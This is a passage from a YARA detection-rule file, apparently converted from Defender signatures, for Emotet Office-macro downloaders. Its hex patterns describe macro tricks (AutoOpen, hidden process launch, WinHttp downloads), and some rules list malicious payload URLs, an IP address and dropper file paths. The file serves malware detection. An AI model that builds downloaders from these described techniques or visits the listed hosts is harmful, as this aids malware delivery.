        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 [0-1] 28 [0-64] 2c 20 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 [0-5] 28 [0-22] 2c 20 [0-22] 2c 20 [0-22] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-112] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {44 69 6d 20 [0-32] 52 65 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RS_2147745478_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RS!MTB"
        threat_id = "2147745478"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 [0-1] 28 [0-64] 2c 20 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 [0-5] 28 [0-22] 2c 20 [0-22] 2c 20 [0-22] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-22] 28 [0-22] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {44 69 6d 20 [0-32] 52 65 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RU_2147745534_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RU!MTB"
        threat_id = "2147745534"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 [0-1] 28 [0-64] 2c 20 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 [0-5] 28 [0-22] 2c 20 [0-22] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-22] 28 [0-22] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = "Trim(\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RV_2147745545_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RV!MTB"
        threat_id = "2147745545"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 [0-1] 28 [0-64] 2c 20 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 [0-20] 28 [0-24] 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-22] 28 [0-22] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 54 72 69 6d 28 [0-16] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RW_2147745569_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RW!MTB"
        threat_id = "2147745569"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 [0-4] 54 72 69 6d 28 [0-22] 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e [0-20] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-22] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RX_2147745579_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RX!MTB"
        threat_id = "2147745579"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 [0-20] 28 [0-69] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e [0-20] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-22] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-2] 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVK_2147745632_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVK!MTB"
        threat_id = "2147745632"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "www.fantasyclub.com.br/imgs/rggmVTfvT/" ascii //weight: 1
        $x_1_2 = "ecoarch.com.tw/cgi-bin/vWW/" ascii //weight: 1
        $x_1_3 = "dp-flex.co.jp/cgi-bin/Bt3Ycq5Tix/" ascii //weight: 1
        $x_1_4 = "dharmacomunicacao.com.br/OLD/PjBkVBhUH/" ascii //weight: 1
        $x_1_5 = "expresocba.com.ar/snnyNkcVAE3Ztitw/TT0h7/" ascii //weight: 1
        $x_1_6 = "nandonikwebdesign.com/OWs/" ascii //weight: 1
        $x_1_7 = "gelish.com/email-hog/YXaPiWbFMKT/" ascii //weight: 1
        $x_1_8 = "nutensport-wezep.nl/wp-includes/QyezZmBmTL8AulMVv0oh/" ascii //weight: 1
        $x_1_9 = "omeryener.com.tr/wp-admin/oakwcoWufii0JR89G/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SA_2147745680_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SA!MTB"
        threat_id = "2147745680"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 23 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e [0-20] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-22] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SB_2147745693_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SB!MTB"
        threat_id = "2147745693"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 23 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e [0-20] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-22] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SC_2147745707_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SC!MTB"
        threat_id = "2147745707"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e [0-20] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SD_2147745750_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SD!MTB"
        threat_id = "2147745750"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 20 5f [0-8] [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e [0-20] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SE_2147745755_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SE!MTB"
        threat_id = "2147745755"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e [0-20] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SF_2147745756_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SF!MTB"
        threat_id = "2147745756"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e [0-20] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SG_2147745793_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SG!MTB"
        threat_id = "2147745793"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Create _" ascii //weight: 1
        $x_1_2 = {4e 65 78 74 ?? ?? 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 [0-6] 69 [0-6] 6e [0-6] 6d [0-6] 67 [0-6] 6d [0-6] 74 [0-6] 73 [0-6] 3a [0-6] 57 [0-6] 69 [0-6] 6e [0-6] 33 [0-6] 32 [0-6] 5f}  //weight: 1, accuracy: Low
        $x_1_3 = {46 75 6e 63 74 69 6f 6e [0-20] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_GZ_2147745802_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.GZ!MTB"
        threat_id = "2147745802"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "32"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {3d 00 20 00 22 00 65 00 78 00 65 00 2e 00 [0-100] 2f 00 2f 00 3a 00 [0-1] 70 00 74 00 74 00 68 00 22 00}  //weight: 10, accuracy: Low
        $x_10_2 = {3d 20 22 65 78 65 2e [0-100] 2f 2f 3a [0-1] 70 74 74 68 22}  //weight: 10, accuracy: Low
        $x_10_3 = {45 00 6e 00 76 00 69 00 72 00 6f 00 6e 00 24 00 28 00 43 00 68 00 72 00 28 00 [0-8] 29 00 20 00 26 00 20 00 43 00 68 00 72 00 28 00 [0-8] 29 00 20 00 26 00 20 00 43 00 68 00 72 00 28 00 [0-8] 29 00 20 00 26 00 20 00 43 00 68 00 72 00 28 00 [0-8] 29 00 29 00 20 00 26 00 20 00 22 00 5c 00 22 00 20 00 26 00 20 00 53 00 74 00 72 00 52 00 65 00 76 00 65 00 72 00 73 00 65 00 28 00 22 00 65 00 78 00 65 00 2e 00 [0-15] 22 00 29 00}  //weight: 10, accuracy: Low
        $x_10_4 = {45 6e 76 69 72 6f 6e 24 28 43 68 72 28 [0-8] 29 20 26 20 43 68 72 28 [0-8] 29 20 26 20 43 68 72 28 [0-8] 29 20 26 20 43 68 72 28 [0-8] 29 29 20 26 20 22 5c 22 20 26 20 53 74 72 52 65 76 65 72 73 65 28 22 65 78 65 2e [0-15] 22 29}  //weight: 10, accuracy: Low
        $x_10_5 = {2e 00 52 00 75 00 6e 00 20 00 [0-8] 20 00 26 00 20 00 22 00 20 00 22 00 20 00 26 00 20 00 [0-8] 20 00 26 00 20 00 22 00 20 00 22 00 2c 00 20 00 49 00 4e 00 56 00 49 00 53 00 49 00 42 00 4c 00 45 00 2c 00 20 00 4e 00 4f 00 57 00 41 00 49 00 54 00}  //weight: 10, accuracy: Low
        $x_10_6 = {2e 52 75 6e 20 [0-8] 20 26 20 22 20 22 20 26 20 [0-8] 20 26 20 22 20 22 2c 20 49 4e 56 49 53 49 42 4c 45 2c 20 4e 4f 57 41 49 54}  //weight: 10, accuracy: Low
        $x_1_7 = {2e 00 4f 00 70 00 65 00 6e 00 20 00 22 00 47 00 45 00 54 00 22 00 2c 00 20 00 [0-8] 2c 00 20 00 46 00 61 00 6c 00 73 00 65 00}  //weight: 1, accuracy: Low
        $x_1_8 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 [0-8] 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_9 = "CreateObject(\"WinHttp.WinHttpRequest" ascii //weight: 1
        $x_1_10 = "CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_11 = ".DeleteFile (" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_10_*) and 2 of ($x_1_*))) or
            ((4 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Emotet_SH_2147745822_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SH!MTB"
        threat_id = "2147745822"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Create" ascii //weight: 1
        $x_1_2 = "+ (\"STARTU\")" ascii //weight: 1
        $x_1_3 = {46 75 6e 63 74 69 6f 6e [0-20] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {4e 65 78 74 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_6 = {4e 65 78 74 ?? ?? 43 72 65 61 74 65 4f 62 6a 65 63 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SJ_2147745849_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SJ!MTB"
        threat_id = "2147745849"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Create" ascii //weight: 1
        $x_1_2 = "+ (\"STARTU\")" ascii //weight: 1
        $x_1_3 = {46 75 6e 63 74 69 6f 6e [0-20] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = {4e 65 78 74 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-24] 28 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SK_2147745871_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SK!MTB"
        threat_id = "2147745871"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Create" ascii //weight: 1
        $x_1_2 = "+ (\"STARTU\")" ascii //weight: 1
        $x_1_3 = {46 75 6e 63 74 69 6f 6e [0-24] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SL_2147745961_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SL!MTB"
        threat_id = "2147745961"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Create" ascii //weight: 1
        $x_1_2 = "+ (\"STARTU\")" ascii //weight: 1
        $x_1_3 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-24] 3d [0-20] 53 65 6c 65 63 74 20 43 61 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-24] 28 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SM_2147745994_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SM!MTB"
        threat_id = "2147745994"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://91.240.118.168/zx/cv/fe.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SM_2147745994_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SM!MTB"
        threat_id = "2147745994"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Create" ascii //weight: 1
        $x_1_2 = "+ (\"STARTU\")" ascii //weight: 1
        $x_1_3 = "= \"winmgmts:Win32_Process\"" ascii //weight: 1
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SM_2147745994_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SM!MTB"
        threat_id = "2147745994"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c:\\programdata\\zhdkjew" ascii //weight: 1
        $x_1_2 = "&c:\\programdata\\vkwer.bat" ascii //weight: 1
        $x_1_3 = "VB_Name = \"HDsfgRds4htkde" ascii //weight: 1
        $x_1_4 = "Hde\", \"\"" ascii //weight: 1
        $x_1_5 = "aVSE\", \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SN_2147746016_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SN!MTB"
        threat_id = "2147746016"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
